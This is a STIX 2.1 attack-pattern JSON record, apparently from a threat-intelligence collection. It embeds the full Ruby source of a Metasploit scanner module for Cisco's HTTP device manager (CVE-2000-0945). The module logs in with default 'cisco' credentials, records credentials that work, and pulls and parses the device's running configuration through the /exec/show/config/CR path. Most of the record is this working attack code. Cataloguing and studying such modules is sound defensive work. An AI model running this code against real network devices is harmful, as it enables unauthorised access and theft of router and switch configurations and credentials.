{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb798edb-262a-4c58-889a-b2cea102b81e",
    "created": "2024-08-14T16:29:07.606252Z",
    "modified": "2024-08-14T16:29:07.606256Z",
    "name": "Cisco Device HTTP Device Manager Access",
    "description": " This module gathers data from a Cisco device (router or switch) with the device manager web interface exposed. The HttpUsername and HttpPassword options can be used to specify authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_device_manager.rb",
            "external_id": "cisco_device_manager.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0945"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n\n  # Include Cisco utility methods\n  include Msf::Auxiliary::Cisco\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Cisco Device HTTP Device Manager Access',\n      'Description'    => %q{\n          This module gathers data from a Cisco device (router or switch) with the device manager\n        web interface exposed. The HttpUsername and HttpPassword options can be used to specify\n        authentication.\n      },\n      'Author'\t\t=> [ 'hdm' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'BID', '1846'],\n          [ 'CVE', '2000-0945'],\n          [ 'OSVDB', '444'],\n        ],\n      'DisclosureDate' => '2000-10-26'))\n    register_options(\n      [\n        OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'cisco']),\n        OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'cisco'])\n      ])\n  end\n\n  def run_host(ip)\n\n    res = send_request_cgi({\n      'uri'  \t\t=>  \"/exec/show/version/CR\",\n      'method'   \t=> 'GET'\n    }, 20)\n\n    if res and res.code == 401\n      print_error(\"#{rhost}:#{rport} Failed to authenticate to this device\")\n      return\n    end\n\n    if res and res.code != 200\n      print_error(\"#{rhost}:#{rport} Unexpected response code from this device #{res.code}\")\n      return\n    end\n\n    if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/\n      print_good(\"#{rhost}:#{rport} Successfully authenticated to this device\")\n      store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])\n\n      # Report a vulnerability only if no password was specified\n      if datastore['HttpPassword'].to_s.length == 0\n\n        report_vuln(\n          {\n            :host\t=> rhost,\n            :port\t=> rport,\n            :proto  => 'tcp',\n            :name\t=> self.name,\n            :info\t=> \"Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/exec/show/version/CR\",\n            :refs   => self.references,\n            :exploited_at => Time.now.utc\n          }\n        )\n\n      end\n\n      res = send_request_cgi({\n        'uri'  \t\t=>  \"/exec/show/config/CR\",\n        'method'   \t=> 'GET'\n      }, 20)\n\n      if res and res.body and res.body =~ /<FORM METHOD([^\\>]+)\\>(.*)/mi\n        config = $2.gsub(/<\\/[A-Z].*/i, '').strip\n        print_good(\"#{rhost}:#{rport} Processing the configuration file...\")\n        cisco_ios_config_eater(rhost, rport, config)\n      else\n        print_error(\"#{rhost}:#{rport} Error: could not retrieve the IOS configuration\")\n      end\n\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-10-26"
}